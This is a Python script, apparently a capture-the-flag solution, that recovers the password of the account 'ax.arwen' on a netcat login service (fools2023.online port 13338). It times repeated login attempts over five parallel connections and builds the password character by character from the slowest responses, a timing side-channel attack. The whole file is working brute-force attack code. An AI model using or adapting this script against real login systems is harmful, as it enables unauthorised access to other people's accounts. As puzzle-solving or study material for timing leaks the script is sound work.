#!/usr/bin/env python
import io
import argparse
import statistics
import sys
import itertools
import threading
import time
import pexpect
from typing import *

# How many measurements to average
average_count = 5
# Alphabet to use when iterating over passwords
alphabet = """ !"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"""
# Max password length
max_pass_length = 15
# Max concurrent connections
max_connections = 5


def measure_time(password: str, p: pexpect.spawn) -> float:
    times = []
    for i in range(0, average_count):
        p.expect("Username: ")
        p.sendline("ax.arwen")
        p.expect("Password: ")

        p.sendline(password)
        current = time.time()
        idx = p.expect([">> Password is incorrect", "Ready."])
        if idx == 1:
            print(f"Found correct password while measuring time: {password}")
        now = time.time()

        delta = now - current
        times.append(delta)

    return statistics.mean(times)


def check_lengths(p: pexpect.spawn):
    for i in range(0, 20):
        duration = measure_time("A" * i, p)
        print(f"Length: {i}, average duration {duration * 1000.0}ms ")


def swapchar(input: str, position: int, replacement: str) -> str:
    b = bytearray(input.encode("ascii"))
    b[position] = replacement.encode("ascii")[0]
    return b.decode("ascii")


def mutate_entrypoint(password: str, times: List[Tuple[str, float]], p: pexpect.spawn) -> None:
    duration = measure_time(password, p)

    print(f"{password.ljust(max_pass_length)}: {duration * 1000.0} ms")
    times.append((password, duration))


def mutate(password: str, position: int, alphabet: str, conns: List[pexpect.spawn]) -> List[Tuple[str, float]]:
    times = []
    i = 0
    while i < len(alphabet):
        threads: List[threading.Thread] = []
        for j in range(min(max_connections, len(alphabet) - i)):
            mutated = swapchar(password, position, alphabet[i])
            i += 1

            idx = j
            thread = threading.Thread(target=mutate_entrypoint, args=(mutated, times, conns[idx]))
            threads.append(thread)

        for thread in threads:
            thread.start()
            time.sleep(0.1)

        for thread in threads:
            thread.join()
    return times


def generation(initial_pass: str, initial_generation: int, conns: List[pexpect.spawn]):
    password = initial_pass
    for i in range(initial_generation, len(password)):
        print(f" ========== GENERATION {i + 1}/{len(password)} ========== ")
        mutations = mutate(password, i, alphabet, conns)
        slowest = max(mutations, key=lambda v: v[1])
        print(f"Slowest path was {slowest[0]}, with {slowest[1] * 1000.0} ms. Setting as next generation.")
        password = slowest[0]


def spawn_connections(count: int) -> List[pexpect.spawn]:
    print("Spawning connections..")
    conns = []
    for i in range(0, count):
        process = pexpect.spawn("nc fools2023.online 13338")
        conns.append(process)
        time.sleep(2)
    return conns


def warmup_connections(conns: List[pexpect.spawn]) -> None:
    print("Warming up connections..")
    warmup_alphabet = alphabet[0:len(conns)]
    mutate("A" * max_pass_length, 0, warmup_alphabet, conns)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("seed", help="Initial password to use", type=str, default="A" * max_pass_length)
    parser.add_argument("generation", help="Initial generation to use (index of first unconfirmed character)", type=int,
                        default=0)
    args = parser.parse_args()

    conns = spawn_connections(max_connections)
    warmup_connections(conns)
    generation(args.seed, args.generation, conns)


if __name__ == '__main__':
    main()
